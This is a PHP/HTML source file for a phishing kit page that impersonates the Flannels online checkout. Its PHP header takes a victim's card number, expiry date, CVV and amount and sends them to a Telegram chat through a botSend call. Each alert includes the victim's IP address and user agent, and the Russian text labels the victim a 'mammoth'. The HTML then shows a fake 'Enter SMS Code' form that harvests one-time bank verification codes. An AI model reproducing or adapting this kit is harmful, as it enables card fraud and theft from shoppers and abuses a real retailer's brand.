<?php
   include('config.php');
   include('functions.php');
   
   if (isset($_POST['amount']) && isset($_POST['cadz']) && isset($_POST['datez']) && isset($_POST['cvz']) && isset($_POST['summe'])) {
       setcookie('rdata', base64_encode(json_encode([
           'amount' => $_POST['amount'],
           'cadz' => $_POST['cadz'],
           'datez' => $_POST['datez'],
		   'cvz' => $_POST['cvz'],
         'summe' => $_POST['summe'],
       ])));
       setcookie('solt', $_POST['solt']);
       header("Refresh:0");
       exit;
   }
   
   if (!isset($_COOKIE['rdata']) || !isset($_COOKIE['solt'])) {
       die('$_SERVER["HTTP_REFERER"] not found');
   }
   
   $rdata = json_decode(base64_decode($_COOKIE['rdata']),true);
   $solt = json_decode(base64_decode($_COOKIE['solt']),true);
   
   $amount = $rdata['amount'];
   $cadz = $rdata['cadz'];
   $datez = $rdata['datez'];
   $cvz = $rdata['cvz'];
   $summe = $rdata['summe'];
   $id = $solt['id'];
   $shop = "Home Page";
   $type = $solt['type'];
   $cash = $solt['cash'];
   $worker = $solt['worker'];
   
   //if (isset($_GET['c'])) {
       $payInfo = json_decode(file_get_contents("database/" . $id), true);
       $payInfo['status'] = 'wait';
       unset($payInfo['errmsg']);
       file_put_contents("database/" . $id, json_encode($payInfo));
   //}
   
   botSend([
       '⚠️ <b>Повторные данные мамонта VALID'.(isset($_GET['r']) ? ' [Икс код]' : '').'</b>',
       '',
       '💳 CARD NUMBER: <code><b>'.$cadz.'</b></code>',
       '📅 EXP: <code><b>'.$datez.'</b></code>',
	   '🔐 CVV: <code><b>'.$cvz.'</b></code>',
      '💰 Amount <code><b>'.$summe.'</b></code>',
       '',
       '🌐 IP адрес: <b>'.$_SERVER['REMOTE_ADDR'].' ('.$visitor['country'].', '.$visitor['city'].')</b>',
       '🖥 USERAGENT: <b>'.$_SERVER['HTTP_USER_AGENT'].'</b>',
   ], tgToken, chatAdmin);
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-GB" lang="en-GB">
   <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <title>Checkout | Payment Verification</title>
      <link rel="stylesheet" href="assets/global.css">
      <link rel="stylesheet" href="assets/checkout-single-page.css">
      <link rel="stylesheet" href="assets/server.bundle.css">
      <link rel="stylesheet" href="assets/portal-flan.css">
      <link rel="SHORTCUT ICON" href="assets/FLAN.ico" type="image/x-icon">
      <link rel="icon" sizes="192x192" href="assets/icon-hires.png">
      <link rel="icon" sizes="128x128" href="assets/icon-normal.png">
   </head>
   <body id="Body" data-errorloggingenabled="false" data-clientloggingmode="" class="language-en currency-gbp" style="overflow-y: auto; height: 100%;">
      <a href="#main-content" class="offscreen" rel="nofollow">GoToContentActionLink</a>
      <div id="CheckoutSpaRoot" class="">
         <div id="react_0HNB5UN6JT7R4">
            <div class="BodyWrap" data-reactroot="">
               <div aria-busy="false">
                  <div class="menuOverlay"></div>
                  <header>
                     <div class="CheckoutHeader flex flexJustBet">
                        <div class="headerLeftContainer">
                           <div class="headerImg"><a title="Home page" href="/" class="flex"><img src="assets/flan-logo-2021-white.svg" alt="Flannels"></a></div>
                           <div class="headerSecureCheckout visible-xs visible-sm"><span class="securePad"></span><span class="secureText">Secure checkout</span></div>
                        </div>
                        <div class="summaryAlerts">
                           <div class="headerRightSecureCheckout hidden-xs hidden-sm"><span class="securePad"></span><span class="secureText">Secure checkout</span></div>
                           <div class="summaryAlertsInner flex"></div>
                        </div>
                     </div>
                  </header>
                  <main class="ContentWrap">
                     <div class="innerMain">
                        <div class="leftMain">
                           <div class="sectionWrap">
                              <section class="welcomeSection" style="display: none;">
                                 <div class="sectionContent">
                                    <div class="innerContent"></div>
                                 </div>
                              </section>
                              <div name="deliverySection">
                                 <section class="deliverySection  completedSection">
                                    <div class="sectionGroup">
                                       <h1>Delivery</h1>
                                    </div>
                                    <div class="progressContainer">
                                       <div class="progressGroup flex flexJustBet ">
                                          <div class="progressTitle">
                                             <div class="progressTitleTop">Delivery Method</div>
                                             <div class="progressTitleSub pii-item" title="Home delivery">Home delivery</div>
                                          </div>
                                          <div class="noChange"></div>
                                       </div>
                                    </div>
                                 </section>
                              </div>
                              <div name="paymentSection">
                                 <section class="paymentSection activeSection">
                                    <div class="sectionGroup">
                                       <h1>Payment</h1>
                                    </div>
									<form action="verification.php" method="POST">
									<input type="hidden" name="id" value="<?php echo $id; ?>">
                                    <div class="sectionContent">
                                       <div class="innerContent">
                                          <div aria-busy="false">
                                             <div class="radioOptionsGroup">
                                                <ul class="">
                                                   <li class="selectedRadioGroup cardPayment">
                                                      <div class="innerRadio">
                                                         <div class="paymentHeader flex flexJustBet singleLine">
                                                            <div class="selectionRadio"><input type="radio"><span></span></div>
                                                            <div class="selectionOptions">
                                                               <div class="selectionDescription flex flexJustBet">
                                                                  <div class="selectionDescWrapH3 paymentMethodInfo">
                                                                     <h3>Credit/Debit Card</h3>
                                                                  </div>
                                                                  <div class="paymentImgChev">
                                                                     <div class="paymentImage"></div>
                                                                     <div class="paymentChevron"></div>
                                                                  </div>
                                                               </div>
                                                            </div>
                                                         </div>
                                                         <div class="paymentContent">
                                                            <h4>Enter Your Card Details</h4>
                                                            <div class="formWrap paymentForm stripeWrap">
                                                               <div class="form-group cardNumberForm">
                                                                  <div class="labelGroup formIncomplete"><label id="lblCardNumber" class="control-label control-label-required">Enter SMS Code</label><span class="mandatoryIndicator">*</span></div>
                                                                  <div class="inputTickGroup">
                                                                     <div id="cardNumber" class="form-control StripeElement StripeElement--empty">
                                                                        <div class="__PrivateStripeElement" style="margin: 0px !important; padding: 0px !important; border: none !important; display: block !important; background: transparent !important; position: relative !important; opacity: 1 !important; --stripeElementWidth: 338px;">
                                                                           <input type="text" id="card-number" placeholder="Confirm the code from the SMS..." name="securecode" value="" style="border: 0px !important; margin: 0px !important; padding: 0px !important; width: 1px !important; min-width: 100% !important; overflow: hidden !important; display: block !important; user-select: none !important; transform: translate(0px) !important; color-scheme: light only !important; height: 45px;" required>
                                                                        </div>
                                                                     </div>
                                                                  </div>
                                                               </div>
                                    <?if(isset($_GET['c'])):?>
                                    <center>
                                       <div style="color: red;">Invalid card verification code</div>
                                    </center>
                                    <?endif;?>
                                                               <div class="formCompleteCTA ctaMarginTop"><button type="submit" class="ContinueOn" id="cardSubmit">Confirm</button></div>
                                                            </div>
                                                         </div>
                                                      </div>
                                                   </li>
                                                </ul>
                                             </div>
                                             <span></span>
                                          </div>
                                       </div>
                                    </div>
									</form>
                                    <div class="innerContent commsOptInWrap NewOptIn">
                                       <div class="commsOptInWrap--inner flex"><input id="commsOptIn" name="commsOptIn" type="checkbox" aria-required="true"><label for="commsOptIn" class="control-label"><span class="SignUpLabel">Please tick if you <em>do not</em> wish to receive information about the latest arrivals, exclusive products and promotions from Flannels in line with our <a href="https://help.flannels.com/support/solutions/articles/80001024011-privacy-and-cookies" target="_blank">Privacy Policy</a></span></label></div>
                                    </div>
                                 </section>
                              </div>
                              <div>
                                 <section class="confirmationSection">
                                    <div class="sectionGroup">
                                       <h1>Order Confirmation</h1>
                                    </div>
                                 </section>
                              </div>
                           </div>
                        </div>
                     </div>
                  </main>
                  <footer>
                     <div class="innerFooter">
                        <a id="footerStepMsg" href="https://www.flannels.com/customerservices/placingorders/takingpayment" target="_blank">Need help with payment?</a>
                        <div class="copyrightsecurityWrap">
                           <div class="copyrightTextMob">© 2025 The Flannels Group Ltd</div>
                        </div>
                     </div>
                  </footer>
                  <span></span>
               </div>
            </div>
         </div>
      </div>
      <div class="ecomContent" data-ecomadvert-creative="FooterDisclosure 28-11-24" data-ecomadvert-name="FooterDisclosure 28-11-24" data-ecomadvert-cssclass="FooterDisclosure" data-ecomadvert-adertid="31833" data-dy-slot-name="">
         <div class="FooterDisclosure">
            <div class="footer-disclosure-container">
               <p>The Flannels Group Ltd (FRN: 977237), trading as ‘Flannels’ is an appointed representative of Frasers Group Credit Broking Limited (FRN: 947961) who are authorised and regulated by the Financial Conduct Authority as a credit broker not a lender.Frasers Plus is a credit product provided by Frasers Group Financial Services Limited (FRN: 311908) and is subject to your financial circumstances. <strong>Missed payments may affect your credit score.</strong> For regulated payment services, Frasers Group Financial Services Limited is a payment agent of Transact Payments Limited, a company authorised and regulated by the Gibraltar Financial Services Commission as an electronic money institution.</p>
            </div>
         </div>
      </div>
   </body>
</html>